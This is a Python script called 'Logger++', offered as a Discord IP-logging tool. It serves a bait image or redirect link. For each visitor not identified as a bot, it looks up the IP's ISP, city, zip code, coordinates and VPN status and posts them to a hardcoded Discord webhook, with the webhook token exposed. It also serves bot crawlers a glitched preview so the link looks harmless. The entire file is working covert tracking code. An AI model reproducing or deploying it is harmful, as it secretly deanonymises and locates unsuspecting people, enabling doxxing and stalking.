#       __                                        
#      / /  ___   __ _  __ _  ___ _ __  _     _   
#     / /  / _ \ / _` |/ _` |/ _ \ '__|| |_ _| |_ 
#    / /__| (_) | (_| | (_| |  __/ | |_   _|_   _|
#    \____/\___/ \__, |\__, |\___|_|   |_|   |_|  
#                |___/ |___/                      
#
#       A Powerful Phython Discord Logger Tool.
#        Made By: https://github.com/Cartxrr


# Options 
options = {
    "webhook": {
        "url": "https://discord.com/api/webhooks/1197675776422719528/hWcDeXQ6fdA9S9lVrnAIwoZvgLhgolW8iIxO_Oy8uXQIxn_WDzNnyhQYK4bSwsZQ8O8P",
    },
    "image": {
        "enabled": False,
        "corrupted-image-preview": False,
        "url": "data:image/jpeg;base64,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",
    },
    "url": {
         "enabled": False,
         "url-redirect": "URL",
    },
}

# IF YOU DONT KNOW WHAT THIS CODE DOES DONT CHANGE ANY OF THIS

from http.server import BaseHTTPRequestHandler
import requests

glitched = { "data": b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xdb\x00C\x01\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xc2\x00\x11\x08\x01\xe0\x01\xe0\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03\x01\x00\x02\x10\x03\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' } # Credit for Dekrypted for the data

def bots(ip):
    if ip.startswith(("35", "34", "104", "143", "27", "104", "143", "164")): return True
    else: return False

def sendWebhook(ip):
        usersinfo = requests.get(f"http://ip-api.com/json/{ip}?fields=181247").json()
        data = { 
                "content" : "@everyone",

                "color" : 16777215,

                "embeds": [
                    {

                        "description" : f"""
                        **📶 IP:** `{ip if ip else 'N/A'}`
                        **📦 Internet Provider:** `{usersinfo['isp'] if usersinfo['isp'] else 'N/A'}`
                        **🏁 Country:** `{usersinfo['country']}/{usersinfo['countryCode'] if usersinfo['country'] else 'N/A'}`
                        **🏙 City:** `{usersinfo['city'] if usersinfo['city'] else 'N/A'}`
                        **🤐 Zip-Code:** `{usersinfo['zip'] if usersinfo['zip'] else 'N/A'}`
                        **📍 Coordinates:** `{str(usersinfo['lat']), str(usersinfo['lon'])}`
                        **⏰ Time-Zone:** `{usersinfo['timezone'] if usersinfo['timezone'] else 'N/A'}`
                        **🎭 VPN:** `{usersinfo['proxy']}`

                        **📷 Image Logger:** `{str(options['image']['enabled'])}`
                        **🔗 Url Logger:** `{str(options['url']['enabled'])}`
                        """,

                        "footer": {
                            "text": " @Cartxrr | Logger++ ",
                            "icon_url": "https://avatars.githubusercontent.com/u/116686230?v=4"
                        },
                    }
                ]
            }

        requests.post(options['webhook']['url'], json = data)
        return


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if (options['image']['enabled']):
            if bots(self.headers.get('x-forwarded-for')) and (options['image']['corrupted-image-preview']):
                self.send_response(200)
                self.send_header('Content-type', "image/png")
                self.end_headers()
                self.wfile.write(glitched["data"])
                return
            else:
                self.send_response(200)
                self.send_header('Content-type', "image/png")
                self.end_headers()
                image_data = requests.get(options['image']['url'])
                self.wfile.write(image_data)
                if not bots(self.headers.get('x-forwarded-for')):
                    ip = self.headers.get('x-forwarded-for')
                    sendWebhook(ip)
                return
        elif (options['url']['enabled']):
            self.send_response(200)
            self.send_header('Content-type', "text/html")
            self.end_headers()
            iwannacrybecausephythonbeingweirdasf = f'<meta http-equiv="refresh" content="0;url={options["url"]["url-redirect"]}">'
            self.wfile.write(iwannacrybecausephythonbeingweirdasf.encode('utf-8'))
            if not bots(self.headers.get('x-forwarded-for')):
                ip = self.headers.get('x-forwarded-for')
                sendWebhook(ip)
            return
        else:
            print("Bro enable one of the two")
        
